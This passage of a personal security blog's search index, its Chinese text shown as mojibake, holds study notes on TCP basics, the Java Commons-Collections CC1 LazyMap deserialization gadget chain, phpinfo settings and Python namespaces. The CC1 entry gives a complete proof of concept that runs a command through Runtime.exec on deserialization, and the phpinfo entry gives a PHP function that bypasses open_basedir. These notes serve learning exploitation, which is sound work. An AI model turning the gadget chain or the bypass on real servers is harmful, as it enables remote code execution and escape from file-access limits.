src="E:\typora img\image-20221123180012945.png" alt="image-20221123180012945" style="zoom:80%;" /><h2 id="ç¬¬äº”ç« "><a href="#ç¬¬äº”ç« " class="headerlink" title="ç¬¬äº”ç« "></a>ç¬¬äº”ç« </h2><h4 id="ç«¯å£å·"><a href="#ç«¯å£å·" class="headerlink" title="ç«¯å£å·"></a>ç«¯å£å·</h4><img src="E:\typora img\image-20221123223516713.png" alt="image-20221123223516713" style="zoom:80%;" /><h4 id="UDPå’ŒTCPæ•°æ®æŠ¥æ ¼å¼"><a href="#UDPå’ŒTCPæ•°æ®æŠ¥æ ¼å¼" class="headerlink" title="UDPå’ŒTCPæ•°æ®æŠ¥æ ¼å¼"></a>UDPå’ŒTCPæ•°æ®æŠ¥æ ¼å¼</h4><img src="E:\typora img\image-20221123223117231.png" alt="image-20221123223117231" style="zoom:80%;" /><h4 id="TCPè¿æ¥"><a href="#TCPè¿æ¥" class="headerlink" title="TCPè¿æ¥"></a>TCPè¿æ¥</h4><p>![image-20221123224240643](E:\typora img\image-20221123224240643.png)</p><p>åºå·ï¼šæŒ‡çš„æ˜¯å‘é€çš„æ•°æ®è½½è·çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ã€‚</p><p>ç¡®è®¤å·ï¼šæŒ‡çš„æ˜¯å·²ç»æˆåŠŸæ¥å—åˆ°åºå·è‡³ï¼ˆç¡®è®¤å·-1ï¼‰çš„æ•°æ®ï¼Œå¸Œæœ›å¯¹æ–¹å‘é€çš„æ•°æ®æ˜¯ä»ç¡®è®¤å·å¼€å§‹çš„ã€‚</p><p>ACKï¼š1è¡¨ç¤ºæˆåŠŸæ¥æ”¶ï¼Œåªæœ‰è®¾ç½®ä¸º1ï¼Œç¡®è®¤å·æ‰æ˜¯æœ‰æ•ˆçš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVAååºåˆ—åŒ–ä¹‹CC1--LazyMap</title>
      <link href="/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1--LazyMap/"/>
      <url>/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1--LazyMap/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1â€“lazyMap-chains"><a href="#CC1â€“lazyMap-chains" class="headerlink" title="CC1â€“lazyMap chains"></a>CC1â€“lazyMap chains</h1><p><strong>ysoserialä¸­cc1é“¾ä½¿ç”¨çš„æ˜¯LazyMap</strong></p><h2 id="å‰ç½®çŸ¥è¯†javaä»£ç†"><a href="#å‰ç½®çŸ¥è¯†javaä»£ç†" class="headerlink" title="å‰ç½®çŸ¥è¯†javaä»£ç†"></a>å‰ç½®çŸ¥è¯†javaä»£ç†</h2><p><a href="https://y4er.com/posts/java-proxy/">https://y4er.com/posts/java-proxy/</a></p><p>å…³é”®ç‚¹</p><p><strong>è¢«åŠ¨æ€ä»£ç†çš„å¯¹è±¡è°ƒç”¨ä»»æ„æ–¹æ³•éƒ½ä¼šé€šè¿‡å¯¹åº”çš„InvocationHandlerçš„invokeæ–¹æ³•è§¦å‘</strong></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å±é™©æ–¹æ³•æ˜¯<code>InvokerTransformer.transform()</code>ï¼Œä¹‹å‰ä½¿ç”¨çš„æ˜¯ TransformedMap ä¸‹çš„ checkSetValue æ–¹æ³•æ¥è°ƒç”¨ï¼Œè¿™æ¬¡ç”¨LazyMap ä¸‹çš„ get æ–¹æ³•è°ƒç”¨ factory.transform</p><p><img src="/../images/bc583ebe2ca03158524014c0e27c3392.png" alt="image-20220115100212144"></p><p><strong>getæ–¹æ³•</strong></p><p><img src="/../images/image-20230930134701285.png" alt="image-20230930134701285"></p><p><strong>è°è°ƒç”¨äº†getæ–¹æ³•</strong></p><p><img src="/../images/b6b801a95373e418363d74b1f56f1edd.png" alt="image-20220115103043004"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler</code> ä¸­çš„invokeæ–¹æ³•ï¼Œç»“åˆåŠ¨æ€ä»£ç†å¯ä»¥çŸ¥é“invoke æ–¹æ³•åœ¨å¯¹è±¡ä»£ç†æ—¶ä¼šè¢«è§¦å‘ã€‚è€Œå®é™…ä¸Šè¿™ä¸ªç±»å®é™…å°±æ˜¯ä¸€ä¸ª<code>InvocationHandler</code>ï¼Œæˆ‘ä»¬å¦‚æœå°†è¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆåœ¨<code>readObject</code>çš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥åˆ°<code>AnnotationInvocationHandler#invoke</code>æ–¹æ³•ä¸­ï¼Œè¿›è€Œè§¦å‘æˆ‘ä»¬çš„<code>LazyMap#get</code>ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ„å»ºå¯¹è±¡</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// åˆ›å»ºLazyMapçš„handlerå®ä¾‹</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Action.class, outerMap);</span><br><span class="line"><span class="comment">// åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†å®ä¾‹</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);  <span class="comment">// åŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œæ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œéƒ½ä¼šåˆ°invokeä¸­å»</span></span><br></pre></td></tr></table></figure><p>ä»£ç†åçš„å¯¹è±¡å«åšproxyMapï¼Œä½†æˆ‘ä»¬ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬å…¥å£ç‚¹æ˜¯ <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨<code>AnnotationInvocationHandler</code>å¯¹è¿™ä¸ªproxyMapè¿›è¡ŒåŒ…è£¹ï¼ˆæˆ‘ä»¬éœ€è¦çš„æ˜¯<code>AnnotationInvocationHandler</code>è¿™ä¸ªç±»çš„å¯¹è±¡ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerå®ä¾‹ï¼Œå¹¶ä¸”æŠŠåˆšåˆšåˆ›å»ºçš„ä»£ç†èµ‹å€¼ç»™this.memberValues</span></span><br><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); </span><br></pre></td></tr></table></figure><p><strong>å®Œæ•´poc</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„å»ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// åˆ›å»ºLazyMapçš„handlerå®ä¾‹</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="comment">// åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†å®ä¾‹</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerå®ä¾‹ï¼Œå¹¶ä¸”æŠŠåˆšåˆšåˆ›å»ºçš„ä»£ç†èµ‹å€¼ç»™this.memberValues</span></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        serialize(handler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230930143412695.png" alt="image-20230930143412695"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpinfoä¸­çš„ä¿¡æ¯</title>
      <link href="/2023/05/01/phpinfo/"/>
      <url>/2023/05/01/phpinfo/</url>
      
        <content type="html"><![CDATA[<h1 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h1><p><a href="https://www.php.net/manual/zh/ini.core.php">PHP: php.ini æ ¸å¿ƒæŒ‡ä»¤è¯´æ˜ - Manual</a></p><p>ini_set()</p><p><a href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p><h1 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h1><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><a href="https://www.k0rz3n.com/2019/02/12/PHPINFO%20%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF/">phpinfoä¸­çš„é‡è¦ä¿¡æ¯</a></p><table><thead><tr><th align="center">å˜é‡</th><th align="center">ä½œç”¨</th></tr></thead><tbody><tr><td align="center">open_basedir</td><td align="center">é™åˆ¶ç›®å½•è®¿é—®ï¼ˆå¯ä»¥ç»•è¿‡ï¼‰</td></tr><tr><td align="center">disable_function</td><td align="center">ç¦ç”¨å‡½æ•°ï¼ˆå¯ä»¥ç»•è¿‡ï¼‰</td></tr><tr><td align="center">session.save_path</td><td align="center">é…åˆæ–‡ä»¶åŒ…å«</td></tr><tr><td align="center">_SERVER</td><td align="center">å„ç§ä¸»æœºä¿¡æ¯</td></tr><tr><td align="center">pecl</td><td align="center">confing.phpå†™ğŸ</td></tr></tbody></table><h2 id="open-basedirç»•è¿‡"><a href="#open-basedirç»•è¿‡" class="headerlink" title="open_basedirç»•è¿‡"></a>open_basedirç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åœ¨index.phpä¸‹</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">æ‰€ä»¥å¦‚æœç”¨æˆ·é€šè¿‡index.phpæ¥è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œåªèƒ½è®¿é—®/<span class="keyword">var</span>/www/html/</span><br></pre></td></tr></table></figure><p><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/">open_basedirç»•è¿‡</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass_open_basedir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>))&#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span>);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_Ei34Ww_sQDfq_path</span>,<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_Ei34Ww_sQDfq_i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$_Ei34Ww_sQDfq_i</span> &lt; <span class="variable">$_Ei34Ww_sQDfq_num</span>)&#123;</span><br><span class="line">                @<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">                <span class="variable">$_Ei34Ww_sQDfq_i</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span>.<span class="string">&#x27;/&#x27;</span>.<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="disable-functionç»•è¿‡"><a href="#disable-functionç»•è¿‡" class="headerlink" title="disable_functionç»•è¿‡"></a>disable_functionç»•è¿‡</h2><p>å¦‚ä½•è®¾ç½®<code>disable_function</code></p><blockquote><p>åœ¨phpé…ç½®æ–‡ä»¶php.iniä¸­è®¾ç½®</p></blockquote><p>ç»•è¿‡ï¼š<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions</a></p><p>â€‹<a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><p>å¸¸è§çš„webshellç®¡ç†å·¥å…·éƒ½è‡ªå¸¦ç›¸å…³ç»•è¿‡çš„æ¨¡å—ã€‚</p><h2 id="é…åˆæ–‡ä»¶åŒ…å«Getshell"><a href="#é…åˆæ–‡ä»¶åŒ…å«Getshell" class="headerlink" title="é…åˆæ–‡ä»¶åŒ…å«Getshell"></a>é…åˆæ–‡ä»¶åŒ…å«Getshell</h2>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonå‘½åç©ºé—´</title>
      <link href="/2023/05/01/python%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"/>
      <url>/2023/05/01/python%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>Fromï¼š<a href="https://www.bilibili.com/video/BV12F411t78n">https://www.bilibili.com/video/BV12F411t78n</a></p><p>å¼€å¤´è¯´äº†ä¸€æ®µè¯</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">lf you import another module, it will have its global scope</span><br><span class="line">æ¯ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±çš„å…¨å±€ç©ºé—´</span><br><span class="line">Each function has its local scope</span><br><span class="line">æ¯ä¸ªå‡½æ•°éƒ½æœ‰è‡ªå·±çš„å±€éƒ¨ç©ºé—´</span><br><span class="line">Every time the function is called, a new scope is created</span><br><span class="line">æ¯å½“å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªç©ºé—´ç»™å®ƒä½¿ç”¨</span><br><span class="line">Certain Python objects like &#x27;print&#x27; function, &#x27;None&#x27;,&#x27;True&#x27;, &#x27;False&#x27;, are available everywhere in your program and they are in the built-in scope</span><br><span class="line">pythonå†…ç½®çš„å‡½æ•°åœ¨ç¨‹åºçš„ä»»ä½•ä¸€ä¸ªç©ºé—´éƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå®ƒä»¬å­˜åœ¨äºbuilt-inç©ºé—´ä¸­ã€‚</span><br><span class="line">The variables or name bindings are stored in namespaces</span><br><span class="line">å˜é‡å’Œå‡½æ•°åœ°å€éƒ½å­˜å‚¨åœ¨å‘½åç©ºé—´ä¸­</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆ‘æ ¹æ®è§†é¢‘çš„ç”»çš„ï¼Œå·¦è¾¹çš„globalç©ºé—´æ˜¯socketæ¨¡å—çš„ï¼Œå³è¾¹çš„globalç©ºé—´æ˜¯æˆ‘ä»¬ç¨‹åºçš„ï¼ˆæˆ‘ç»™å®ƒèµ·äº†å«originalï¼‰</p><img src="E:\typora img\Untitled-2022-08-08-1428.png" alt="Untitled-2022-08-08-1428" style="zoom:80%;" /><p>æ‰€ä»¥æˆ‘ä»¬çš„ç¨‹åºå¤„åœ¨orginalé‡Œï¼Œæ‰€ä»¥æƒ³ç”¨socketæ¨¡å—ä¸­çš„æ–¹æ³•å°±å¿…é¡»ç”¨.æ¥è®¿é—®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment">#åˆ›å»ºTCP/IPå¥—æ¥å­—</span></span><br><span class="line">tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment">#åˆ›å»ºUDP/IPå¥—æ¥å­—</span></span><br><span class="line">udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬åƒä¸‹é¢è¿™æ ·å†™ï¼Œå°±ç›¸å½“äºæŠŠsocketæ¨¡å—å¯¼å…¥åˆ°æˆ‘ä»¬çš„å‘½åç©ºé—´originalä¸­ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨æ–¹æ³•äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#åˆ›å»ºTCP/IPå¥—æ¥å­—</span></span><br><span class="line">tcpSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"><span class="comment">#åˆ›å»ºUDP/IPå¥—æ¥å­—</span></span><br><span class="line">udpSock = socket(AF_INET, SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>ä»€ä¹ˆéƒ½æ²¡æœ‰çš„py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    a=<span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">locals</span>())<span class="comment">#æŸ¥çœ‹testå‡½æ•°æ‰€åœ¨çš„localç©ºé—´</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())<span class="comment">#æŸ¥çœ‹globalç©ºé—´</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">test()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(__builtins__))<span class="comment">#æŸ¥çœ‹built-inç©ºé—´ï¼ˆå°±æ˜¯pythonçš„å†…ç½®å‡½æ•°å’Œæ¨¡å—ï¼‰</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808144812676-1687707604251.png" alt="image-20220808144812676"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#global</span></span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000023A5A4A0850</span>&gt;,  <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, </span><br><span class="line"> <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, </span><br><span class="line"> <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;,  </span><br><span class="line"> <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;d:\\python3.8\\code\\1.py&#x27;</span>, </span><br><span class="line"> <span class="string">&#x27;__cached__&#x27;</span>: <span class="literal">None</span>, </span><br><span class="line"> <span class="string">&#x27;test&#x27;</span>: &lt;function test at <span class="number">0x0000023A5A5E9F70</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808140251398-1687707604252.png" alt="image-20220808140251398"></p><p>å› ä¸ºåœ¨my_funcä¸­å…ˆä½¿ç”¨äº†å˜é‡a<code>print(f&quot;iprefix&#125; &#123;a&#125;&quot;)</code>,ç„¶åæ‰åœ¨my_funcä¸­å£°æ˜äº†å˜é‡a,æ‰€ä»¥æŠ¥é”™ã€‚</p><p><img src="/../images/image-20220808140402575-1687707604252.png" alt="image-20220808140402575"></p><p>åœ¨my_funcä¸­å£°æ˜äº†<code>global a</code>,æ‰€ä»¥pythonçŸ¥é“localç©ºé—´ä¸­çš„aæŒ‡å‘globalç©ºé—´ä¸­çš„aã€‚</p><p>æ‰€ä»¥åœ¨localä¸­æ”¹å˜açš„å€¼ï¼Œä¼šå½±å“globalä¸­çš„aã€‚</p><p><img src="/../images/image-20220808140452593-1687707604252.png" alt="image-20220808140452593"></p><p>åŸæœ¬åœ¨globalç©ºé—´ä¸­æ²¡æœ‰å˜é‡a,ä½†æ˜¯åœ¨localä¸­å£°æ˜äº†<code>global a</code>ï¼Œpythonä¼šè‡ªåŠ¨åœ¨globalä¸­åˆ†é…ç©ºé—´ç»™å˜é‡aã€‚</p><blockquote><p>ä½œè€…è¯´itâ€™s bad codeğŸ˜„</p></blockquote><p><img src="/../images/image-20220808140611573-1687707604252.png" alt="image-20220808140611573"></p><p><code>globals()</code>è¿”å›çš„æ˜¯å­—å…¸å½¢å¼ï¼Œå¯ä»¥é€šè¿‡é”®å€¼ç´¢å¼•çš„æ–¹å¼è®¿é—®ã€‚</p><p><img src="/../images/image-20220808140711338-1687707604252.png" alt="image-20220808140711338"></p><p>å¦‚ä½•å±•ç¤ºå‡½æ•°çš„localç©ºé—´ä¸­ä¿å­˜çš„å˜é‡</p><ol><li><p>å‡½æ•°çš„bodyä¸­<code>print(locals())</code></p></li><li><p>é€šè¿‡å‡½æ•°çš„codeæ–¹æ³•ä¸‹çš„å±æ€§è®¿é—®</p><p><img src="/../images/image-20220808151843058-1687707604252.png" alt="image-20220808151843058"></p></li></ol><p><img src="/../images/image-20220808153058120-1687707604253.png" alt="image-20220808153058120"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">x=<span class="number">20</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line"><span class="keyword">global</span> x</span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">test2()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808141136207-1687707604253.png" alt="image-20220808141136207"></p><p><img src="/../images/image-20220808141228174-1687707604253.png" alt="image-20220808141228174"></p><p>nonlocalç”¨äºå¯»æ‰¾åŒä¸ºlocalç©ºé—´çš„å˜é‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nonlocal means, not in the current function&#x27;s local scope and neither in the global scope</span><br><span class="line">nonlocalçš„å¯»æ‰¾èŒƒå›´ï¼šä¸Šä¸€çº§localç©ºé—´åˆ°globalç©ºé—´çš„ä¸‹ä¸€çº§</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808141525359-1687707604253.png" alt="image-20220808141525359"></p><p><img src="/../images/image-20220808141538079-1687707604253.png" alt="image-20220808141538079"></p><p>è™½ç„¶globalä¸­å£°æ˜äº†å˜é‡aï¼Œä½†æ˜¯nonlocalè¿˜æ˜¯æ‰¾ä¸åˆ°å˜é‡a</p><p><img src="/../images/image-20220808141845300-1687707604253.png" alt="image-20220808141845300"></p><p><img src="/../images/image-20220808141538079-1687707604253.png" alt="image-20220808141538079"></p><p>å³ä½¿åœ¨localä¸­å£°æ˜äº†<code>global a</code>,nonlocalä»ç„¶æ‰¾ä¸åˆ°å˜é‡a</p><p>æ‰€ä»¥nonlocalçš„å¯»æ‰¾èŒƒå›´ï¼šä¸Šä¸€çº§localç©ºé—´åˆ°globalç©ºé—´çš„ä¸‹ä¸€çº§</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonæŠ€å·§</title>
      <link href="/2023/05/01/python%E6%8A%80%E5%B7%A7/"/>
      <url>/2023/05/01/python%E6%8A%80%E5%B7%A7/</url>
      
